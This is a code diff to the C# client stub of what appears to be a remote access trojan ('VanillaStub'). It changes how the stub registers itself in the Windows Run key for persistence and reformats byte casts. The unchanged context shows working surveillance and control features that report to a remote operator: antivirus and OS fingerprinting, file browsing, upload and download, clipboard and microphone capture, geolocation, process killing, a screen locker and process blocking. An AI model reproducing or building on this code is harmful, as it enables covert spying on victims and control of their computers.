@@ -83,7 +83,7 @@ namespace VanillaStub.Forms
             {
                 RegistryKey RK =
                     Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                RK.DeleteValue("VClient", false);
+                RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
             }
         }
 
@@ -97,8 +97,8 @@ namespace VanillaStub.Forms
                     {
                         RegistryKey RK =
                             Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        RK.DeleteValue("VClient", false);
-                        RK.SetValue("VClient", Application.ExecutablePath);
+                        RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
+                        RK.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), InstallPath);
                     }
 
                     return;
@@ -161,17 +161,17 @@ namespace VanillaStub.Forms
                     case EventType.Connected:
                         Console.WriteLine("Connected");
                         List<byte> ToSend = new List<byte>();
-                        ToSend.Add((int) DataType.ClientTag);
+                        ToSend.Add((int)DataType.ClientTag);
                         ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
                         Networking.MainClient.Send(ToSend.ToArray());
                         ToSend.Clear();
-                        ToSend.Add((int) DataType.AntiVirusTag);
+                        ToSend.Add((int)DataType.AntiVirusTag);
                         ToSend.AddRange(Encoding.ASCII.GetBytes(ComputerInfo.GetAntivirus()));
                         Networking.MainClient.Send(ToSend.ToArray());
                         string OperatingSystemUnDetailed = ComputerInfo.GetWindowsVersion()
                             .Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
                         ToSend.Clear();
-                        ToSend.Add((int) DataType.WindowsVersionTag);
+                        ToSend.Add((int)DataType.WindowsVersionTag);
                         ToSend.AddRange(Encoding.ASCII.GetBytes(OperatingSystemUnDetailed));
                         Networking.MainClient.Send(ToSend.ToArray());
                         break;
@@ -209,7 +209,7 @@ namespace VanillaStub.Forms
                         return;
                     }
 
-                    
+
 
                     string Directory = CurrentDirectory;
                     if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
@@ -222,11 +222,11 @@ namespace VanillaStub.Forms
                         Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                  F.CreationTime + "]";
                     List<byte> ToSend = new List<byte>();
-                    ToSend.Add((int) DataType.FilesListType);
+                    ToSend.Add((int)DataType.FilesListType);
                     ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                     Networking.MainClient.Send(ToSend.ToArray());
                     ToSend.Clear();
-                    ToSend.Add((int) DataType.NotificationType);
+                    ToSend.Add((int)DataType.NotificationType);
                     ToSend.AddRange(
                         Encoding.ASCII.GetBytes("The file " + Path.GetFileName(FileToWrite) + " was uploaded."));
                     Networking.MainClient.Send(ToSend.ToArray());
@@ -399,7 +399,7 @@ namespace VanillaStub.Forms
                 SLActive = true;
                 Cursor.Hide();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes("Started screen locker."));
                 Networking.MainClient.Send(ToSend.ToArray());
                 if (!SL.Visible)
@@ -410,7 +410,7 @@ namespace VanillaStub.Forms
                 SLActive = false;
                 Cursor.Show();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes("Stopped screen locker."));
                 Networking.MainClient.Send(ToSend.ToArray());
                 if (SL.Visible)
@@ -427,7 +427,7 @@ namespace VanillaStub.Forms
                 ProcessList.Add("{" + P.ProcessName + "}<" + P.Id + ">[" + P.MainWindowTitle + "]");
             string[] StringArray = ProcessList.ToArray<string>();
             List<byte> ToSend = new List<byte>();
-            ToSend.Add((int) DataType.ProcessType);
+            ToSend.Add((int)DataType.ProcessType);
             string ListString = "";
             foreach (string Process in StringArray) ListString += "][" + Process;
             ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
@@ -511,7 +511,7 @@ namespace VanillaStub.Forms
                     Synth.SetOutputToDefaultAudioDevice();
                     Synth.Speak(Message);
                     List<byte> ToSend = new List<byte>();
-                    ToSend.Add((int) DataType.NotificationType);
+                    ToSend.Add((int)DataType.NotificationType);
                     ToSend.AddRange(Encoding.ASCII.GetBytes("The message " + Message + " was played."));
                     Networking.MainClient.Send(ToSend.ToArray());
                 }
@@ -528,7 +528,7 @@ namespace VanillaStub.Forms
                 Process P = Process.GetProcessById(Convert.ToInt16(ToEnd));
                 P.Kill();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes("The process " + P.ProcessName + " was killed."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -543,7 +543,7 @@ namespace VanillaStub.Forms
             {
                 Process.Start(ToOpen);
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes("The website " + ToOpen + " was opened."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -565,12 +565,12 @@ namespace VanillaStub.Forms
                     Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                              F.CreationTime + "]";
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.FilesListType);
+                ToSend.Add((int)DataType.FilesListType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                 Networking.MainClient.Send(ToSend.ToArray());
                 CurrentDirectory = Directory;
                 ToSend.Clear();
-                ToSend.Add((int) DataType.CurrentDirectoryType);
+                ToSend.Add((int)DataType.CurrentDirectoryType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -591,14 +591,14 @@ namespace VanillaStub.Forms
                 }
 
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.FileType);
+                ToSend.Add((int)DataType.FileType);
                 ToSend.AddRange(FileBytes);
                 Networking.MainClient.Send(ToSend.ToArray());
             }
             catch (Exception EX)
             {
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes("Error Downloading: " + EX.Message + ")"));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -632,7 +632,7 @@ namespace VanillaStub.Forms
             {
                 Process.Start(ToOpen);
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToOpen) + " was opened."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -647,7 +647,7 @@ namespace VanillaStub.Forms
                 string ToDelete = GetSubstringByString("{", "}", Data);
                 File.Delete(ToDelete);
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(
                     Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToDelete) + " was deleted."));
                 Networking.MainClient.Send(ToSend.ToArray());
@@ -697,7 +697,7 @@ namespace VanillaStub.Forms
             ComputerInfoList.Add("City: " + ComputerInfo.GeoInfo.City);
             foreach (string Info in ComputerInfoList.ToArray()) ListString += "," + Info;
             List<byte> ToSend = new List<byte>();
-            ToSend.Add((int) DataType.InformationType);
+            ToSend.Add((int)DataType.InformationType);
             ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
             Networking.MainClient.Send(ToSend.ToArray());
         }
@@ -735,7 +735,7 @@ namespace VanillaStub.Forms
                 STAThread.Start();
                 STAThread.Join();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.ClipboardType);
+                ToSend.Add((int)DataType.ClipboardType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes(ClipboardText));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -750,7 +750,7 @@ namespace VanillaStub.Forms
                 APActive = true;
                 AntiProcess.StartBlock();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes("Started Anti-Process."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -759,7 +759,7 @@ namespace VanillaStub.Forms
                 APActive = false;
                 AntiProcess.StopBlock();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes("Stopped Anti-Process."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -863,7 +863,7 @@ namespace VanillaStub.Forms
                     }
 
                     List<byte> ToSend = new List<byte>();
-                    ToSend.Add((int) DataType.MicrophoneRecordingType);
+                    ToSend.Add((int)DataType.MicrophoneRecordingType);
                     ToSend.AddRange(FileBytes);
                     Networking.MainClient.Send(ToSend.ToArray());
                     File.Delete(AudioPath);
